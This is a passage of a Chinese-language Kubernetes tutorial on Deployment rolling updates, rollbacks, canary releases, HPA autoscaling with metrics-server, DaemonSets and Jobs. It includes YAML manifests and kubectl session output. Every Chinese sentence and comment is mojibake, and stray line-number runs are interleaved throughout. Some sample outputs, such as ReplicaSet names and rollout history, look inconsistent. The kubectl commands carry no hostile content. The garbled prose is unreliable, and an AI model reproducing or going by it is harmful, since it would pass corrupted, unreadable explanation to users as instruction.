      0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     containercreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     containercreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     containercreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\næ»å¨æ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n    rollingupdate:\n      maxsurge: 25% \n      maxunavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                           ready   status    restarts   age\npc-deployment-c848d767-8rbzt   1/1     running   0          31m\npc-deployment-c848d767-h4p68   1/1     running   0          31m\npc-deployment-c848d767-hlmz4   1/1     running   0          31m\npc-deployment-c848d767-rrqcn   1/1     running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     containercreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     running             0          1s\npc-deployment-c848d767-h4p68    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     containercreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     running             0          2s\npc-deployment-c848d767-hlmz4    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     containercreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     running             0          0s\npc-deployment-c848d767-8rbzt    0/1     terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     containercreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     running             0          2s\npc-deployment-c848d767-rrqcn    0/1     terminating         0          34m\n\n# è³æ­¤ï¼æ°çæ¬çpodåå»ºå®æ¯ï¼å°±çæ¬çpodéæ¯å®æ¯\n# ä¸­é´è¿ç¨æ¯æ»å¨è¿è¡çï¼ä¹å°±æ¯è¾¹éæ¯è¾¹åå»º\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\næ»å¨æ´æ°çè¿ç¨ï¼\n\n\n\néåæ´æ°ä¸­ rs çååï¼å¯ä»¥å¨åå»ºéåå¾æ¶åå  --recode åæ°ï¼æå©äºè®°å½åå»ºè¿ç¨ç­ã\n\n# æ¥çrs,åç°åæ¥çrsçä¾æ§å­å¨ï¼åªæ¯podæ°éåä¸ºäº0ï¼èååæ°äº§çäºä¸ä¸ªrsï¼podæ°éä¸º4\n# å¶å®è¿å°±æ¯deploymentè½å¤è¿è¡çæ¬åéçå¥¥å¦æå¨ï¼åé¢ä¼è¯¦ç»è§£é\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nçæ¬åé\ndeployment æ¯æçæ¬åçº§è¿ç¨ä¸­çæåãç»§ç»­åè½ä»¥åçæ¬åéç­è¯¸å¤åè½ï¼ä¸é¢å·ä½æ¥ç.\n\nkubectl rolloutï¼ çæ¬åçº§ç¸å³åè½ï¼æ¯æä¸é¢çéé¡¹ï¼\n\n * status æ¾ç¤ºå½ååçº§ç¶æ\n * history æ¾ç¤º åçº§åå²è®°å½\n * pause æåçæ¬åçº§è¿ç¨\n * resume ç»§ç»­å·²ç»æåççæ¬åçº§è¿ç¨\n * restart éå¯çæ¬åçº§è¿ç¨\n * undo åæ»å°ä¸ä¸çº§çæ¬ï¼å¯ä»¥ä½¿ç¨ --to-revision åæ»å°æå®çæ¬ï¼\n\n# æ¥çå½ååçº§çæ¬çç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# æ¥çåçº§åå²è®°å½\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nrevision  change-cause\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# å¯ä»¥åç°æä¸æ¬¡çæ¬è®°å½ï¼è¯´æå®æè¿ä¸¤æ¬¡åçº§\n\n# çæ¬åæ»\n# è¿éç´æ¥ä½¿ç¨--to-revision=1åæ»å°äº1çæ¬ï¼ å¦æçç¥è¿ä¸ªéé¡¹ï¼å°±æ¯åéå°ä¸ä¸ªçæ¬ï¼å°±æ¯2çæ¬\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# æ¥çåç°ï¼éè¿nginxéåçæ¬å¯ä»¥åç°å°äºç¬¬ä¸ç\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nname            ready   up-to-date   available   age   containers   images         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# æ¥çrsï¼åç°ç¬¬ä¸ä¸ªrsä¸­æ4ä¸ªpodè¿è¡ï¼åé¢ä¸¤ä¸ªçæ¬çrsä¸­podä¸ºè¿è¡\n# å¶å®deploymentä¹æä»¥å¯æ¯å®ç°çæ¬çåæ»ï¼å°±æ¯éè¿è®°å½ä¸åå²rsæ¥å®ç°çï¼\n# ä¸æ¦æ³åæ»å°åªä¸ªçæ¬ï¼åªéè¦å°å½åçæ¬podæ°ééä¸º0ï¼ç¶åå°åæ»çæ¬çpodæåä¸ºç®æ æ°éå°±å¯ä»¥äº\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\néä¸éåå¸\ndeployment æ§å¶å¨æ¯ææ§å¶æ´æ°è¿ç¨ä¸­çæ§å¶ï¼å¦ âæå (pause)â æ âç»§ç»­ (resume)â æ´æ°æä½ã\n\næ¯å¦æä¸æ¹æ°ç pod èµæºåå»ºå®æåç«å³æåæ´æ°è¿ç¨ï¼æ­¤æ¶ï¼ä»å­å¨ä¸é¨åæ°çæ¬çåºç¨ï¼ä¸»ä½é¨åè¿æ¯æ§ççæ¬ãç¶åï¼åç­éä¸å°é¨åçç¨æ·è¯·æ±è·¯ç±å°æ°çæ¬ç pod åºç¨ï¼ç»§ç»­è§å¯è½å¦ç¨³å®å°æææçæ¹å¼è¿è¡ãç¡®å®æ²¡é®é¢ä¹ååç»§ç»­å®æä½ä¸ç pod èµæºæ»å¨æ´æ°ï¼å¦åç«å³åæ»æ´æ°æä½ãè¿å°±æ¯æè°çéä¸éåå¸ã\n\n# æ´æ°deploymentççæ¬ï¼å¹¶éç½®æådeployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#è§å¯æ´æ°ç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n devã\nwaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# çæ§æ´æ°çè¿ç¨ï¼å¯ä»¥çå°å·²ç»æ°å¢äºä¸ä¸ªèµæºï¼ä½æ¯å¹¶æªæç§é¢æçç¶æå»å é¤ä¸ä¸ªæ§çèµæºï¼å°±æ¯å ä¸ºä½¿ç¨äºpauseæåå½ä»¤\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-rj8sq   1/1     running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          3m31s\n\n# ç¡®ä¿æ´æ°çpodæ²¡é®é¢äºï¼ç»§ç»­æ´æ°\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# æ¥çæåçæ´æ°æåµ\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                       desired   current   ready   age     containers   images         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6c9f56fcfb-7bfwh   1/1     running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nå é¤ deployment\n\n# å é¤deploymentï¼å¶ä¸çrsåpodä¹å°è¢«å é¤\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# horizontal pod autoscaler(hpa)\n\nå¨åé¢çè¯¾ç¨ä¸­ï¼æä»¬å·²ç»å¯ä»¥å®ç°éè¿æå·¥æ§è¡ kubectl scale å½ä»¤å®ç° pod æ©å®¹æç¼©å®¹ï¼ä½æ¯è¿æ¾ç¶ä¸ç¬¦å kubernetes çå®ä½ç®æ  -- èªå¨åãæºè½åã kubernetes ææå¯ä»¥å®ç°éè¿çæµ pod çä½¿ç¨æåµï¼å®ç° pod æ°éçèªå¨è°æ´ï¼äºæ¯å°±äº§çäº horizontal pod autoscalerï¼hpaï¼è¿ç§æ§å¶å¨ã\n\nhpa å¯ä»¥è·åæ¯ä¸ª pod å©ç¨çï¼ç¶åå hpa ä¸­å®ä¹çææ è¿è¡å¯¹æ¯ï¼åæ¶è®¡ç®åºéè¦ä¼¸ç¼©çå·ä½å¼ï¼æåå®ç° pod çæ°éçè°æ´ãå¶å® hpa ä¸ä¹åç deployment ä¸æ ·ï¼ä¹å±äºä¸ç§ kubernetes èµæºå¯¹è±¡ï¼å®éè¿è¿½è¸ªåæ rc æ§å¶çææç®æ  pod çè´è½½ååæåµï¼æ¥ç¡®å®æ¯å¦éè¦éå¯¹æ§å°è°æ´ç®æ  pod çå¯æ¬æ°ï¼è¿æ¯ hpa çå®ç°åçã\n\n\n\n1 å®è£ metrics-server\nmetrics-server å¯ä»¥ç¨æ¥æ¶ééç¾¤ä¸­çèµæºä½¿ç¨æåµ\n\n# å®è£git\n[root@k8s-master01 ~]# yum install git -y\n# è·åmetrics-server, æ³¨æä½¿ç¨ççæ¬\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# ä¿®æ¹deployment, æ³¨æä¿®æ¹çæ¯éåååå§ååæ°\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\næå¾ä¸­æ·»å ä¸é¢éé¡¹\nhostnetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=internalip,hostname,internaldns,externaldns,externalip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# å®è£metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# æ¥çpodè¿è¡æåµ\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     running   0          90s\n\n# ä½¿ç¨kubectl top node æ¥çèµæºä½¿ç¨æåµ\n[root@k8s-master01 1.8+]# kubectl top node\nname           cpu(cores)   cpu%   memory(bytes)   memory%\nk8s-master01   289m         14%    1582mi          54%       \nk8s-node01     81m          4%     1195mi          40%       \nk8s-node02     72m          3%     1211mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nname                              cpu(cores)   memory(bytes)\ncoredns-6955765f44-7ptsb          3m           9mi\ncoredns-6955765f44-vcwr5          3m           8mi\netcd-master                       14m          145mi\n...\n# è³æ­¤,metrics-serverå®è£å®æ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 åå¤ deployment å servie\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n  replicas: 1\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # èµæºéé¢\n          limits:  # éå¶èµæºï¼ä¸éï¼\n            cpu: "1" # cpuéå¶ï¼åä½æ¯coreæ°\n          requests: # è¯·æ±èµæºï¼ä¸éï¼\n            cpu: "100m"  # cpuéå¶ï¼åä½æ¯coreæ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# åå»ºservice\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=nodeport --port=80 -n dev\n\n\n1\n2\n\n\n# æ¥ç\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nname                    ready   up-to-date   available   age\ndeployment.apps/nginx   1/1     1            1           47s\n\nname                         ready   status    restarts   age\npod/nginx-7df9756ccc-bh8dr   1/1     running   0          47s\n\nname            type       cluster-ip      external-ip   port(s)        age\nservice/nginx   nodeport   10.101.18.29   <none>        80:31830/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 é¨ç½² hpa\nåå»º pc-hpa.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: autoscaling/v1\nkind: horizontalpodautoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minreplicas: 1  #æå°podæ°é\n  maxreplicas: 10 #æå¤§podæ°é\n  targetcpuutilizationpercentage: 3 # cpuä½¿ç¨çææ ï¼3%ï¼\n  scaletargetref:   # æå®è¦æ§å¶çnginxä¿¡æ¯\n    apiversion: apps/v1\n    kind: deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºhpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# æ¥çhpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nname     reference          targets   minpods   maxpods   replicas   age\npc-hpa   deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 æµè¯\nä½¿ç¨åæµå·¥å·å¯¹ service å°å 192.168.5.4:31830 è¿è¡åæµï¼ç¶åéè¿æ§å¶å°æ¥ç hpa å pod çåå\nhpa åå\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nname   reference      targets  minpods  maxpods  replicas  age\npc-hpa  deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  deployment/nginx  0%/3%   1     10     1      14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment åå\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod åå\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname                     ready   status    restarts   age\nnginx-7df9756ccc-bh8dr   1/1     running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     containercreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     containercreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     containercreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     containercreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     containercreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     running             0          33s\nnginx-7df9756ccc-g56qb   1/1     running             0          48s\nnginx-7df9756ccc-fgst7   1/1     running             0          66s\nnginx-7df9756ccc-fgst7   1/1     terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# daemonset(ds)\n\ndaemonset ç±»åçæ§å¶å¨å¯ä»¥ä¿è¯å¨éç¾¤ä¸­çæ¯ä¸å°ï¼ææå®ï¼èç¹ä¸é½è¿è¡ä¸ä¸ªå¯æ¬ãä¸è¬éç¨äºæ¥å¿æ¶éãèç¹çæ§ç­åºæ¯ãä¹å°±æ¯è¯´ï¼å¦æä¸ä¸ª pod æä¾çåè½æ¯èç¹çº§å«çï¼æ¯ä¸ªèç¹é½éè¦ä¸åªéè¦ä¸ä¸ªï¼ï¼é£ä¹è¿ç±» pod å°±éåä½¿ç¨ daemonset ç±»åçæ§å¶å¨åå»ºã\n\n\n\ndaemonset æ§å¶å¨çç¹ç¹ï¼\n\n * æ¯å½åéç¾¤ä¸­æ·»å ä¸ä¸ªèç¹æ¶ï¼æå®ç pod å¯æ¬ä¹å°æ·»å å°è¯¥èç¹ä¸\n * å½èç¹ä»éç¾¤ä¸­ç§»é¤æ¶ï¼pod ä¹å°±è¢«åå¾åæ¶äº\n\nä¸é¢åæ¥çä¸ daemonset çèµæºæ¸åæä»¶\n\napiversion: apps/v1 # çæ¬å·\nkind: daemonset # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: daemonset\nspec: # è¯¦ææè¿°\n  revisionhistorylimit: 3 # ä¿çåå²çæ¬\n  updatestrategy: # æ´æ°ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n    rollingupdate: # æ»å¨æ´æ°\n      maxunavailable: 1 # æå¤§ä¸å¯ç¨ç¶æç pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: nginx-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nåå»º pc-daemonset.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: daemonset      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºdaemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# æ¥çdaemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nname        desired  current  ready  up-to-date  available   age   containers   images         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# æ¥çpod,åç°å¨æ¯ä¸ªnodeä¸é½è¿è¡ä¸ä¸ªpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nname                 ready   status    restarts   age   ip            node    \npc-daemonset-9bck8   1/1     running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     running   0          37s   10.244.2.74   node2      \n\n# å é¤daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# job\n\njobï¼ä¸»è¦ç¨äºè´è´£ ** æ¹éå¤ç (ä¸æ¬¡è¦å¤çæå®æ°éä»»å¡) ç­æçä¸æ¬¡æ§ (æ¯ä¸ªä»»å¡ä»è¿è¡ä¸æ¬¡å°±ç»æ)** ä»»å¡ãjob ç¹ç¹å¦ä¸ï¼\n\n * å½ job åå»ºç pod æ§è¡æåç»ææ¶ï¼job å°è®°å½æåç»æç pod æ°é\n * å½æåç»æç pod è¾¾å°æå®çæ°éæ¶ï¼job å°å®ææ§è¡\n\n\n\njob çèµæºæ¸åæä»¶ï¼\n\napiversion: batch/v1 # çæ¬å·\nkind: job # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: job\nspec: # è¯¦ææè¿°\n  completions: 1 # æå®jobéè¦æåè¿è¡podsçæ¬¡æ°ãé»è®¤å¼: 1\n  parallelism: 1 # æå®jobå¨ä»»ä¸æ¶å»åºè¯¥å¹¶åè¿è¡podsçæ°éãé»è®¤å¼: 1\n  activedeadlineseconds: 30 # æå®jobå¯è¿è¡çæ¶é´æéï¼è¶è¿æ¶é´è¿æªç»æï¼ç³»ç»å°ä¼å°è¯è¿è¡ç»æ­¢ã\n  backofflimit: 6 # æå®jobå¤±è´¥åè¿è¡éè¯çæ¬¡æ°ãé»è®¤æ¯6\n  manualselector: true # æ¯å¦å¯ä»¥ä½¿ç¨selectoréæ©å¨éæ©podï¼é»è®¤æ¯false\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: counter-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [counter-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never # éå¯ç­ç¥åªè½è®¾ç½®ä¸ºneveræèonfailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> å³äºéå¯ç­ç¥è®¾ç½®çè¯´æï¼\n> å¦ææå®ä¸º onfailureï¼å job ä¼å¨ pod åºç°æéæ¶éå¯å®¹å¨ï¼èä¸æ¯åå»º podï¼failed æ¬¡æ°ä¸å\n> å¦ææå®ä¸º neverï¼å job ä¼å¨ pod åºç°æéæ¶åå»ºæ°ç podï¼å¹¶ä¸æé pod ä¸ä¼æ¶å¤±ï¼ä¹ä¸ä¼éå¯ï¼failed æ¬¡æ°å  1\n> å¦ææå®ä¸º always çè¯ï¼å°±æå³çä¸ç´éå¯ï¼æå³ç job ä»»å¡ä¼éå¤å»æ§è¡äºï¼å½ç¶ä¸å¯¹ï¼æä»¥ä¸è½è®¾ç½®ä¸º always\n\nåå»º pc-job.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: batch/v1\nkind: job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualselector: true\n  selector:\n    matchlabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartpolicy: never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºjob\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nname     completions   duration   age   containers   images         selector\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# éè¿è§å¯podç¶æå¯ä»¥çå°ï¼podå¨è¿è¡å®æ¯ä»»å¡åï¼å°±ä¼åæcompletedç¶æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   status     restarts      age\npc-job-rxg96   1/1     running     0            29s\npc-job-rxg96   0/1     completed   0            33s\n\n# æ¥ä¸æ¥ï¼è°æ´ä¸podè¿è¡çæ»æ°éåå¹¶è¡æ°é å³ï¼å¨specä¸è®¾ç½®ä¸é¢ä¸¤ä¸ªéé¡¹\n#  completions: 6 # æå®jobéè¦æåè¿è¡podsçæ¬¡æ°ä¸º6\n#  parallelism: 3 # æå®jobå¹¶åè¿è¡podsçæ°éä¸º3\n#  ç¶åéæ°è¿è¡jobï¼è§å¯ææï¼æ­¤æ¶ä¼åç°ï¼jobä¼æ¯æ¬¡è¿è¡3ä¸ªpodï¼æ»å±æ§è¡äº6ä¸ªpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nname           ready   